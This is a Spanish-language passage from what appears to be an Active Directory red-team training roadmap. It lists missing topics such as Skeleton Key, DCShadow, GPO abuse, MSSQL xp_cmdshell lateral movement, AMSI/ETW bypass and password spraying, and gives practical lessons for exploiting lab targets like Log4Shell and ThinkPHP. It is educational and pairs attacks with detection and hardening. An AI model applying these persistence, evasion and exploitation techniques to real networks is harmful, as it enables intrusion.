**1. Persistencia de dominio (dominio propio, hoy disperso).** Falta AdminSDHolder/SDProp, DCShadow, backdoors de GPO, DSRM, Skeleton Key y SID History injection como categoría dedicada — no como "otro tipo de ticket". Es lo que separa a un red-teamer de un scanner.

**2. Híbrido Entra ID / Azure AD.** Gap crítico y moderno: AD Connect (cuenta MSOL → DCSync), PHS/PTA/Seamless SSO, Cloud Kerberos Trust, pivote on-prem↔cloud. Casi ningún dominio real es AD puro hoy; sin esto no sos empleable en 2026.

**3. Abuso de GPO.** SharpGPOAbuse / editar GPOs vinculadas para privesc y movimiento lateral masivo. Vector altísimo y ausente por completo.

**4. BloodHound como metodología, no como comando.** Cypher custom, BH-CE, análisis de attack paths, "shortest path to DA", Owned/High-Value. Enumerar sin saber leer el grafo es media herramienta.

**5. MSSQL en AD.** Links entre servidores, xp_cmdshell, database links para lateral, PowerUpSQL/MSSQLPwner. Aparece en engagements reales constantemente y no está.

**6. OPSEC / evasión.** AMSI bypass, ETW patching, evasión de EDR/AV, LDAP/Kerberos con perfil bajo, obfuscación. Sin esto las técnicas "funcionan en el lab y queman la caja en prod".

**7. Password spraying disciplinado + Timeroasting.** Metodología de spray (lockout, jitter, horarios), pre-auth enum, Timeroasting/AS-REQ. El foothold quedó corto en acceso inicial a escala.

**8. Detección accionable (blue muy teórico).** Event IDs concretos (4662/4769/5136/4768), reglas Sigma, MDI/Defender for Identity y su tuning, honeytokens/cuentas señuelo. Bajar el blue team de "conceptos" a alertas que un SOC arma.

**9. Currency de tooling.** NetExec (CrackMapExec está muerto), Certipy/bloodhound-ce al día, Ludus para labs reproducibles. Un arsenal con nombres viejos delata desactualización.

**10. Vectores de cuenta de máquina.** MachineAccountQuota abuse, Pre-Windows 2000 computers, RODC abuse, GPP passwords legacy. Nichos que aparecen y hoy no están cubiertos.

**11. Ciclo de engagement / reporting.** Scoping, RoE, cadena de evidencia, escritura de informe con priorización de remediación. Es literalmente lo que te contratan a entregar; el arsenal enseña a romper pero no a facturar.

**12. Hardening por prioridad de ataque (falta el puente).** Mapear cada técnica ofensiva a su mitigación concreta (tiered admin/PAW, LAPS+gMSA obligatorio, deshabilitar unconstrained, Protected Users, firmado LDAP/EPA). El hardening baseline existe pero no está enganchado técnica→fix, que es lo que hace útil enseñar ambos lados.

---

## 18. 🧪 Operativa del motor de labs (lecciones de ejecución)

> Montar y explotar labs en local enseña tanto por la **operativa** como por la técnica. Estas lecciones se pagaron con corridas fallidas reales (Log4Shell, ThinkPHP, Docker en WSL). Sirven para no tropezar dos veces.

### A. Ejecución de exploits (transferible a cualquier entorno)
1. **Capturá TODO el output y buscá el indicador — no juzgues por la página visible ni por el `tail`.** El output de un RCE puede venir *antes* o intercalado con un error del framework (pasó con ThinkPHP: el `uid=www-data` salía arriba, la página de error abajo). Regla: `grep uid=` sobre la salida completa, no mirar el final.
2. **Exploit de callback (Log4Shell, SSRF/XXE ciego): la secuencia es `target arriba → listener → trigger`.** El que atrapa tiene que estar vivo *al momento del disparo*. Un listener con timeout que arranca antes de que el contenedor termine de bootear, muere antes de que dispares. Contá el arranque lento del target.
3. **Probá el núcleo del bug de forma SEGURA, sin el último paso peligroso.** `{{7*7}}`→`49` antes del RCE (SSTI); el callback JNDI/LDAP confirma Log4Shell **sin** cargar la clase maliciosa. Nunca corras un binario de terceros (`JNDIExploit.jar` random) como root — es justo lo que enseñás a no hacer.
4. **Reconocé bytes de protocolo como prueba.** `30 0c 02 01 01 60 07 02 01 03 …` = un LDAP BindRequest v3. Los magic bytes cuentan la historia y sirven de evidencia irrefutable.
5. **Un RCE vale lo que valga el usuario que lo corre.** `uid=root` (Spring Cloud Gateway, contenedor como root) vs `uid=www-data`. Documentá siempre el usuario: condiciona el impacto y el próximo paso (privesc / pivot).

### B. Motor de labs (Docker + vulhub en WSL)
6. **La VM de WSL se apaga entre invocaciones y se lleva contenedores y procesos en background.** Hacé *levantar + explotar + capturar + bajar en UN solo script/sesión*. No dejes el contenedor "para el próximo comando": ya no va a estar.
7. **Comandos con loops/variables/funciones vía `wsl.exe -- bash -lc '...'` se rompen en silencio** (nombres en blanco, `$var` vacía). Poné el script en un archivo `.sh` y corré `bash /ruta/script.sh` — nunca lógica compleja inline.
8. **Paths `/mnt/c/...` como argumento suelto se manglan** (Git Bash les antepone su prefijo → "No such file"). Van *dentro* de `bash -lc '...'` (comillas simples).
9. **Corré `docker` como root (`wsl -u root`)** para evitar líos de grupo/permiso; no necesitás la contraseña del usuario.

### C. Patrones que se repiten
10. **Parche incompleto.** El primer fix suele dejar un bypass: Apache 2.4.50 (→ CVE-2021-42013) tras 41773; Log4j 2.15/2.16 tras 44228 (real: 2.17.1). *Atacá:* probá el bypass. *Defendé:* no confíes en el primer parche; verificá contra el caso, no contra el PoC conocido.
11. **Verificado > plausible.** Material escrito "de memoria" mete errores (Event IDs, UUIDs de Sigma, versiones de parche). El método que funciona: **explotar local → capturar los bytes reales → pasar el texto por un fact-check adversarial** antes de publicar. Un dato falso en material de enseñanza es peor que un hueco.

---

Ver [PLAYBOOK.md](PLAYBOOK.md) para la versión canónica.
